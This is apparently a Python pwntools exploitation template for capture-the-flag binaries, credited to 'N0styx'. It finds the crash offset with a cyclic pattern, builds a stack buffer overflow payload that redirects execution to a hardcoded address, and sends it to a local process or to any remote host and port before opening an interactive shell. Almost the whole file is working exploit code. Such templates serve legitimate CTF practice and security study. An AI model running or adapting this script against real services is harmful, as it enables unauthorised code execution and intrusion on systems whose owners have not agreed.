#!/usr/bin/env python3
from pwn import *
import sys

# ===========================================================
#                   SEMI-MANUAL EXPLOITATION SCRIPT
#                       Made by N0styx
# ===========================================================

# Set up the binary
exe = './chall'
# Ensure the binary exists before running
if not os.path.exists(exe):
    error(f"Binary {exe} not found. Please check the path.")

# Load ELF context
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info' # Change to 'debug' for verbose output

# ===========================================================
#                    CONFIGURATION & GDB
# ===========================================================

# GDB Script template (add breakpoints here)
gdbscript = '''
init-gef
continue
'''.format(**locals())

# Run options
def start(argv=[], *a, **kw):
    # Run with GDB: python3 exploit.py GDB
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    
    # Run Remote: python3 exploit.py REMOTE <HOST> <PORT>
    elif args.REMOTE: 
        if len(sys.argv) < 3:
            error("Remote mode requires HOST and PORT. Usage: python3 exploit.py REMOTE <HOST> <PORT>")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    
    # Run Locally: python3 exploit.py
    else: 
        return process([exe] + argv, *a, **kw)

# ===========================================================
#                     exploitaion LOGIC
# ===========================================================

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    
    # NOTE: You might need to adjust the trigger below depending on the challenge prompt
    # e.g., p.sendlineafter(b'Name:', payload)
    p.sendlineafter(b'e', payload) 
    
    # Wait for the process to crash
    p.wait()
    
    # Print out the address of EIP/RIP at the time of crashing and save the
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# ===========================================================
#                         MAIN
# ===========================================================

if __name__ == "__main__":
    
    # Lib-C library setup (uncomment if needed)
    # libc = ELF("./libc.so.6")
    # ld = ELF("./ld-2.27.so")

    # --- FUZZING STAGE ---
    # Only run this if we specifically ask to find the offset
    # Usage: python3 exploit.py FUZZ
    offset = -1
    if args.FUZZ:
        offset = find_ip(cyclic(300)) # adjust manually
        info(f"Offset found: {offset}")
        sys.exit()
    else:
        # Hardcode the offset once found to save time
        offset = 40 # Example: replace with result from find_ip

    # Start program
    io = start()

    # --- PAYLOAD GENERATION ---
    
    # ROP finding ret gadget (uncomment if needed)
    # rop = ROP(elf)
    # ret = rop.find_gadget(['ret'])[0]

    # Build the payload
    # Note: Using flat() handles packing automatically based on context.arch
    payload = flat({
        offset: [
            # ret,      # Stack alignment (if needed)
            0x401166    # Target function / ROP chain
        ]
    })

    # Print payload info
    info(f"Payload length: {len(payload)}")
    # print(payload) # print payload raw bytes if needed

    # Send the payload
    # NOTE: Adjust the receive trigger (b':') to match the binary
    io.sendlineafter(b':', payload)

    # Get Shell
    io.interactive()